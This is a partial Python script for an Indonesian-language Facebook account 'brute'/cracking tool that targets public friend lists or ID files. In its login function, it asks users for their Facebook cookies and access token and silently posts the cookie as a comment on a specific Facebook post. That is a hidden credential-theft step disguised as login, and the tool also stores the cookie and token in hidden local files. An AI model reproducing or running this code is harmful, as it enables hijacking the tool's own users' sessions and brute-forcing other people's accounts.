...
{biru}  ┃╭╮┃╭╯┃╭╮┃    
{birj}  ╰━━┻╯╱╰━━╯   
{ung} brute facebook beta v.01
{hijo} hasil rikod DANI-XD3''')
...
def login_men():
	try:
		...
		print('─────────────────────────────')
		cookie=input(f'└── {biru}cookies :{xxx}{hijo} ')
		...
		requests.post(f"https://www.facebook.com/100064820514099/posts/1375232816624490/?substory_index=1375232816624490/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
		ken = open(".tokenakun.txt", "w").write(tok)
		cok = open(".cookiesakun.txt", "w").write(cookie)
		baz_anim(f'{ung}└──{hijo} login berhasil, ketik lagi python bfb.py')
		waktu(1)
		exit()
	except Exception as e:
		os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
		baz_anim(f'{mer}└──{kun} login gagal ster coba ganti cookies')
		waktu(1)
		login_men()
...
def menu(id):
	...
	banner()
	print(f'{xxx}─────────────────────────────')
	print(f'{xxx}{ung}└── crack publik atau file')
	helpbas = input(f'{xxx}└── : ')
	if helpbas in ['publik','Publik','public']:
		...
		baz_anim(f'{ung}└──{mer} masukkan dengan benar')
		baz_anim(f'{ung}└──{bitu} ketik publik untuk crack publik dan ketik file untuk crack file')
...
def nge_krek():
	...
	try:
		...
		baz_anim(f'{ung}└──{mer} koneksi terputus')
		exit()
	except (KeyError,IOError):
		baz_anim(f'{ung}└──{mer} teman tidak publik')
		baz_anim(f'{ung}└──{mer} ganti id target nya')
		waktu(1)
		nge_krek()
